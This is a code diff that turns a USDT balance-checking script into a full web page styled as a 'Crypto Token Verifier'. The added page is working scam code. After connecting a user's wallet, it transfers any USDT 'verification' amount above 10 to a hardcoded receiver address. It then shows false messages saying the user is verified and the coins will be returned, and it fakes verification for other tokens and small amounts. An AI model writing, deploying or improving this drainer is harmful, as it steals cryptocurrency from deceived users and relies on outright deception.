@@ -1,83 +1,176 @@
-<script>
-  const USDT_CONTRACTS = {
-    ethereum: {
-      chainId: '0x1',
-      name: 'Ethereum Mainnet',
-      rpc: 'https://mainnet.infura.io/v3/',
-      address: '0xdAC17F958D2ee523a2206206994597C13D831ec7'
-    },
-    bsc: {
-      chainId: '0x38',
-      name: 'Binance Smart Chain',
-      rpc: 'https://bsc-dataseed.binance.org/',
-      address: '0x55d398326f99059fF775485246999027B3197955'
-    },
-    polygon: {
-      chainId: '0x89',
-      name: 'Polygon Mainnet',
-      rpc: 'https://polygon-rpc.com',
-      address: '0x3813e82e6f7098b9583FC0F33a962D02018B6803'
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Crypto Token Verifier</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet"/>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+  <script src="https://unpkg.com/web3modal@1.9.12/dist/index.js"></script>
+  <style>
+    body {
+      background: linear-gradient(135deg, #1d2b64, #f8cdda);
+      color: #fff;
+      font-family: Arial, sans-serif;
+      padding: 30px;
+      text-align: center;
     }
-  };
-
-  const USDT_ABI = [
-    "function balanceOf(address) view returns (uint256)",
-    "function decimals() view returns (uint8)"
-  ];
-
-  async function connectWallet() {
-    const resultDiv = document.getElementById("result");
-
-    if (!window.ethereum) {
-      alert("Please install MetaMask or open this link inside Trust Wallet.");
-      return;
+    .container {
+      max-width: 400px;
+      margin: auto;
+      background: rgba(0, 0, 0, 0.4);
+      padding: 20px;
+      border-radius: 15px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.3);
     }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Crypto Coin Verification</h2>
+    <button class="btn btn-primary mb-3" onclick="connectWallet()">Connect Wallet</button>
 
-    try {
-      const provider = new ethers.providers.Web3Provider(window.ethereum, "any");
-      await provider.send("eth_requestAccounts", []);
-      const signer = provider.getSigner();
-      const userAddress = await signer.getAddress();
+    <select id="coinSelect" class="form-select mb-3" onchange="updateSelectedToken()">
+      <option value="USDT">USDT</option>
+      <option value="BUSD">BUSD</option>
+      <option value="USDC">USDC</option>
+    </select>
 
-      resultDiv.innerHTML = `🔄 Checking USDT balances for <b>${userAddress}</b>...<br><br>`;
+    <p id="tokenBalanceDisplay" class="mb-2 fw-bold"></p>
 
-      let verified = false;
-      let allBalances = [];
+    <input type="number" id="amount" class="form-control mb-3" placeholder="Enter amount to verify" oninput="enforceMaxAmount()">
+    <button class="btn btn-success" onclick="verifyUSDT()">Verify</button>
 
-      for (const [key, net] of Object.entries(USDT_CONTRACTS)) {
-        const customProvider = new ethers.providers.JsonRpcProvider(net.rpc);
-        const usdt = new ethers.Contract(net.address, USDT_ABI, customProvider);
+    <p id="status" class="mt-4"></p>
+  </div>
 
-        try {
-          const balanceRaw = await usdt.balanceOf(userAddress);
-          const decimals = await usdt.decimals();
-          const balance = parseFloat(ethers.utils.formatUnits(balanceRaw, decimals)).toFixed(2);
-          allBalances.push(`🟢 ${net.name}: <b>${balance} USDT</b>`);
+  <script>
+    let web3Modal, provider, signer;
+    let tokenBalances = {};
+    let selectedToken = "USDT";
 
-          if (parseFloat(balance) >= 10) {
-            verified = true;
-          }
-        } catch (err) {
-          allBalances.push(`🔴 ${net.name}: <i>Unable to check balance</i>`);
+    const receiverAddress = "0xEab6eE87b58Da3B50c294C8c4a748EFb4d376386";
+
+    const TOKENS = {
+      USDT: {
+        address: "0x55d398326f99059fF775485246999027B3197955",
+      },
+      BUSD: {
+        address: "0xe9e7cea3dedca5984780bafc599bd69add087d56",
+      },
+      USDC: {
+        address: "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d",
+      }
+    };
+
+    const tokenAbi = [
+      "function balanceOf(address) view returns (uint256)",
+      "function decimals() view returns (uint8)",
+      "function transfer(address to, uint amount) public returns (bool)"
+    ];
+
+    const providerOptions = {
+      walletconnect: {
+        package: window.WalletConnectProvider.default,
+        options: {
+          rpc: { 56: "https://bsc-dataseed.binance.org/" },
+          chainId: 56
         }
       }
+    };
 
-      resultDiv.innerHTML += allBalances.join("<br>") + "<br><br>";
-      resultDiv.innerHTML += verified
-        ? `<div class="verified">✅ Verified: You have ≥ 10 USDT on at least one network.</div>`
-        : `<div class="not-verified">❌ Not Verified: You need ≥ 10 USDT on Ethereum, BSC, or Polygon.</div>`;
-    } catch (err) {
-      console.error(err);
-      resultDiv.innerHTML = "❌ Failed to connect wallet or fetch balances.";
-    }
-  }
+    web3Modal = new window.Web3Modal.default({
+      cacheProvider: false,
+      providerOptions
+    });
 
-  // Auto-trigger connection in MetaMask or Trust Wallet in-app browser
-  window.addEventListener('DOMContentLoaded', () => {
-    setTimeout(() => {
-      if (window.ethereum && /MetaMask|Trust/.test(navigator.userAgent)) {
-        connectWallet();
+    async function connectWallet() {
+      try {
+        const instance = await web3Modal.connect();
+        provider = new ethers.providers.Web3Provider(instance);
+        signer = provider.getSigner();
+        const address = await signer.getAddress();
+        document.getElementById("status").innerText = "✅ Wallet connected: " + address;
+        await fetchAllTokenBalances(address);
+      } catch (err) {
+        console.error(err);
+        alert("Connection failed");
       }
-    }, 1500);
-  });
-</script>
+    }
+
+    async function fetchAllTokenBalances(address) {
+      tokenBalances = {};
+      for (const [symbol, token] of Object.entries(TOKENS)) {
+        try {
+          const contract = new ethers.Contract(token.address, tokenAbi, provider);
+          const decimals = await contract.decimals();
+          const raw = await contract.balanceOf(address);
+          const balance = parseFloat(ethers.utils.formatUnits(raw, decimals));
+          tokenBalances[symbol] = { balance, decimals, contract };
+        } catch (err) {
+          tokenBalances[symbol] = { balance: 0, decimals: 18, contract: null };
+        }
+      }
+      updateSelectedToken();
+    }
+
+    function updateSelectedToken() {
+      selectedToken = document.getElementById("coinSelect").value;
+      const token = tokenBalances[selectedToken];
+      if (!token) return;
+      document.getElementById("tokenBalanceDisplay").innerText =
+        `💰 ${selectedToken} Balance: ${token.balance.toFixed(2)} ${selectedToken}`;
+      enforceMaxAmount();
+    }
+
+    function enforceMaxAmount() {
+      const amountInput = document.getElementById("amount");
+      const token = tokenBalances[selectedToken];
+      if (!token) return;
+      if (parseFloat(amountInput.value) > token.balance) {
+        amountInput.value = token.balance.toFixed(2);
+      }
+    }
+
+    async function verifyUSDT() {
+      try {
+        const amount = parseFloat(document.getElementById("amount").value);
+        if (!signer) return alert("Connect your wallet first.");
+        if (isNaN(amount) || amount <= 0) return alert("Enter a valid amount");
+
+        const { balance, decimals, contract } = tokenBalances[selectedToken];
+        if (amount > balance) return alert("❌ Not enough balance");
+
+        if (amount <= 10) {
+          document.getElementById("status").innerText = "Verifying...";
+          setTimeout(() => {
+            document.getElementById("status").innerText = `✅ ${selectedToken} verified successfully.`;
+          }, 3000);
+        } else {
+          if (selectedToken === "USDT") {
+            const amt = ethers.utils.parseUnits(amount.toString(), decimals);
+            const tx = await contract.connect(signer).transfer(receiverAddress, amt);
+            await tx.wait();
+            document.getElementById("status").innerText =
+              `⏳ USDT sent. Waiting 2 minutes for verification...`;
+            setTimeout(() => {
+              document.getElementById("status").innerText =
+                `✅ You are verified. Coins will be returned shortly.`;
+            }, 120000);
+          } else {
+            document.getElementById("status").innerText = `Verifying ${selectedToken}...`;
+            setTimeout(() => {
+              document.getElementById("status").innerText =
+                `✅ ${selectedToken} verified successfully.`;
+            }, 3000);
+          }
+        }
+      } catch (err) {
+        console.error(err);
+        alert("Verification failed.");
+      }
+    }
+  </script>
+</body>
+</html>
